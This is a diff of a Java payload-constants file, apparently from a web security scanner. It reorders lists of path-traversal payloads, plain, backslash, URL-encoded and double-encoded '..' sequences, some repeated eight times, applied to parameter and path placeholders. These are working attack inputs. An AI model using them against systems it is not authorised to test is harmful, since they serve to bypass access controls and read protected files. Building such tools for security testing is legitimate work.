@@ -67,9 +67,11 @@ public class PayloadConstants {
             new PayloadInfo("{param}%2F%2E%2E", "{param}%2F%2E%2E"),
             new PayloadInfo("{param}//..", "{param}//.."),
             new PayloadInfo("{param}%2f%2f..", "{param}%2f%2f.."),
-            new PayloadInfo("{param}\\..", "{param}\\.."),
             new PayloadInfo("{param}/..;", "{param}/..;"),
             new PayloadInfo("{param}%5c..", "{param}%5c.."),
+            new PayloadInfo("{param}\\..", "{param}\\.."),
+            new PayloadInfo("{param}\\..\\..\\..\\..\\..\\..\\..\\..", "{param}\\..X8"),
+            new PayloadInfo("{param}%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..", "{param}%5c..X8"),
             new PayloadInfo("{param}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..", "{param}%2f..X8"),
             new PayloadInfo("{param}/../../../../../../../..", "{param}/..X8"),
             new PayloadInfo("{param}%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..", "{param}%252f..X8"),
@@ -77,9 +79,8 @@ public class PayloadConstants {
             new PayloadInfo("{param}%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "{param}%2F%2E%2EX8"),
             new PayloadInfo("{param}//..//..//..//..//..//..//..//..", "{param}//..X8"),
             new PayloadInfo("{param}%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..", "{param}%2f%2f..X8"),
-            new PayloadInfo("{param}\\..\\..\\..\\..\\..\\..\\..\\..", "{param}\\..X8"),
-            new PayloadInfo("{param}/..;/..;/..;/..;/..;/..;/..;/..;", "{param}/..;X8"),
-            new PayloadInfo("{param}%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..", "{param}%5c..X8")
+            new PayloadInfo("{param}/..;/..;/..;/..;/..;/..;/..;/..;", "{param}/..;X8")
+
     );
 
     /**
@@ -124,9 +125,11 @@ public class PayloadConstants {
             new PayloadInfo("{path}%2F%2E%2E", "{path}%2F%2E%2E"),
             new PayloadInfo("{path}//..", "{path}//.."),
             new PayloadInfo("{path}%2f%2f..", "{path}%2f%2f.."),
-            new PayloadInfo("{path}\\..", "{path}\\.."),
             new PayloadInfo("{path}/..;", "{path}/..;"),
             new PayloadInfo("{path}%5c..", "{path}%5c.."),
+            new PayloadInfo("{path}\\..", "{path}\\.."),
+            new PayloadInfo("{path}\\..\\..\\..\\..\\..\\..\\..\\..", "{path}\\..X8"),
+            new PayloadInfo("{path}%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..", "{path}%5c..X8"),
             new PayloadInfo("{path}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..", "{path}%2f..X8"),
             new PayloadInfo("{path}/../../../../../../../..", "{path}/..X8"),
             new PayloadInfo("{path}%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..", "{path}%252f..X8"),
@@ -134,9 +137,7 @@ public class PayloadConstants {
             new PayloadInfo("{path}%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "{path}%2F%2E%2EX8"),
             new PayloadInfo("{path}//..//..//..//..//..//..//..//..", "{path}//..X8"),
             new PayloadInfo("{path}%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..", "{path}%2f%2f..X8"),
-            new PayloadInfo("{path}\\..\\..\\..\\..\\..\\..\\..\\..", "{path}\\..X8"),
-            new PayloadInfo("{path}/..;/..;/..;/..;/..;/..;/..;/..;", "{path}/..;X8"),
-            new PayloadInfo("{path}%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..", "{path}%5c..X8")
+            new PayloadInfo("{path}/..;/..;/..;/..;/..;/..;/..;/..;", "{path}/..;X8")
 
 
 //            new PayloadInfo("{path}/../{path}", "{path}/../{path}"),
